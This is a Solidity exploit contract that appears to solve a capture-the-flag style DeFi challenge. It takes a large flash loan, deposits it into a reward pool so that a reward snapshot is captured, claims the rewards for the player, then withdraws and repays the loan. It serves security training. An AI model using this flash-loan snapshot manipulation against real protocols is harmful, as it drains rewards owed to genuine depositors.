// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

import "./TheRewarderPool.sol";
import "./FlashLoanerPool.sol";

import "hardhat/console.sol";

//ERC20Snapshot's snapshot can be used inside flashloan callback.
//That's why app should be using previous snapshot instead of the current snapshot.

contract RewarderSolution {
    TheRewarderPool public pool;
    FlashLoanerPool public flash;
    DamnValuableToken public liquidityToken;
    RewardToken public rewardToken;

    address public player;

    constructor(TheRewarderPool pool_, FlashLoanerPool flash_) {
        pool = pool_;
        flash = flash_;

        liquidityToken = flash_.liquidityToken();
        rewardToken = pool.rewardToken();
        player = msg.sender;
    }

    function attack() external {
        flash.flashLoan(1_000_000 ether);
    }

    function receiveFlashLoan(uint256 amount) external {
        liquidityToken.approve(address(pool), amount);
        pool.deposit(amount);

        uint256 rewards = pool.distributeRewards();
        console.log(rewards);
        rewardToken.transfer(player, rewards);

        pool.withdraw(amount);

        liquidityToken.transfer(address(flash), amount);
    }
}